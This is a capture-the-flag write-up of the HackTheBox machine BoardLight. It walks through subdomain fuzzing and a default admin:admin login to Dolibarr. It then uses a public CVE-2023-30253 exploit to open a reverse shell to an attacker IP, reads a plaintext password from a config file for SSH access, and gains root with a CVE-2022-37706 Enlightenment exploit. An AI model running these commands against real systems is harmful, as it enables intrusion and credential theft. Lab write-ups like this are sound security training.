---
title: BoardLight
date: 2026-02-23T00:00:00
draft: false
sources: HackTheBox
difficulties: Easy
tags:
  - Linux
  - CVE-2023-30253
  - CVE-2022-37706
  - Dolibarr
  - Subdomain Enumeration
author: Anx
description: "BoardLight is an easy difficulty Linux machine that features a Dolibarr instance vulnerable to CVE-2023-30253. This vulnerability is leveraged to gain access as www-data. After enumerating and dumping the web configuration file contents, plaintext credentials lead to SSH access to the machine. Enumerating the system, a SUID binary related to enlightenment is identified which is vulnerable to privilege escalation via CVE-2022-37706 and can be abused to leverage a root shell."
---

![](featured.png)

## Enumeration
### Nmap

An initial TCP scan was performed using Nmap to identify exposed services on the target host:

```
sudo nmap -sVC 10.129.5.248 -oA nmap/10.129.5.248-tcp

Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-23 21:50 CET
Nmap scan report for 10.129.5.248
Host is up (0.057s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.18 seconds
```

The scan revealed two open ports:
- **22/tcp** – SSH (OpenSSH 8.2p1 Ubuntu)
- **80/tcp** – HTTP (Apache 2.4.41 Ubuntu)
### Web Enumeration – Port 80

Accessing the web application on port 80 revealed a site named _BoardLight_.  
The domain `board.htb` was identified in the footer section of the page and was added to the local `/etc/hosts` file for proper resolution.

![](Pasted%20image%2020260223215158.png)

```bash
sudo nano /etc/hosts
```

![](Pasted%20image%2020260223215313.png)

No significant functionality was discovered on the main page. Therefore, subdomain enumeration was performed using **ffuf**:

```bash
ffuf -u http://board.htb/ -ic -H "Host: FUZZ.board.htb" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 15949
```

![](Pasted%20image%2020260223215651.png)

This enumeration identified one subdomain `crm.board.htb` that was then added to the /etc/hosts file.

```bash
sudo nano /etc/hosts
```

![](Pasted%20image%2020260223215747.png)
---
### CRM Application Access

Navigating to `crm.board.htb` exposed a CRM platform identified as **Dolibarr ERP CRM**.

![](Pasted%20image%2020260223215805.png)

Authentication was attempted using default credentials (admin:admin):

![](Pasted%20image%2020260223220215.png)

The credentials were valid, and administrative access to the CRM was obtained.
## FootHold

Research identified a known vulnerability in the deployed version of **Dolibarr**:
- **CVE-2023-30253 – Authenticated Remote Command Execution**

The public exploit repository was cloned, required dependencies were installed, and the exploit was executed against the target instance:
- Repository: [https://github.com/Rubikcuv5/cve-2023-30253](https://github.com/Rubikcuv5/cve-2023-30253)

```bash
git clone https://github.com/Rubikcuv5/cve-2023-30253.git
pip install -r requirements.txt --break-system-packages

python3 CVE-2023-30253.py --url http://crm.board.htb/ -u admin -p admin -c "whoami"
```

![](Pasted%20image%2020260223220530.png)

Successful command execution confirmed remote code execution as the `www-data` user. The next step was to established a reverse shell using the exploit’s reverse shell functionality.

A listener was started on the attacking machine:

```bash
nc -lvnp 4444
```

The exploit was executed passing the attacker machine ip and the listener port as parameters.

```bash
python3 CVE-2023-30253.py --url http://crm.board.htb/ -u admin -p admin -r 10.10.14.219 4444
```

A reverse shell connection was received on the configured listener:

![](Pasted%20image%2020260223220757.png)

To stabilize the shell, the following commands were executed:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl + Z
stty raw -echo;fg
```

![](Pasted%20image%2020260223221005.png)

## Lateral Movement (www-data to larissa)

During local enumeration, a plaintext password was discovered in the Dolibarr configuration file:

```
cat ~/html/crm.board.htb/htdocs/conf/conf.php
```

![](Pasted%20image%2020260223224032.png)

User enumeration confirmed that only one local user account existed:

```
cat /etc/passwd | grep /home
```

![](Pasted%20image%2020260223224227.png)

The identified credentials were used to authenticate via SSH:

```
ssh larissa@board.htb
```

![](Pasted%20image%2020260223224314.png)

Authentication was successful, and a fully interactive SSH session as `larissa` was obtained.
## Privilege Escalation (larissa to root)

SUID binaries were enumerated:

```
find / -perm -u=s -type f 2>/dev/null
```

![](Pasted%20image%2020260223224430.png)

During local enumeration, multiple binaries associated with **Enlightenment** were identified. Further research revealed a known local privilege escalation vulnerability affecting the installed version:

- **CVE-2022-37706 – Enlightenment SUID Privilege Escalation**

A publicly available exploit was download from the following repository:
- [https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)

The exploit was transferred to the target system and saved as `exploit.sh`.

```bash
nano exploit.sh
```

![](Pasted%20image%2020260223224608.png)

Execution permissions were assigned to the exploit file. The exploit was then executed, resulting in the spawning of a root shell and full administrative control over the server.

```
chmod +x exploit.sh
./exploit.sh
```

![](Pasted%20image%2020260223224649.png)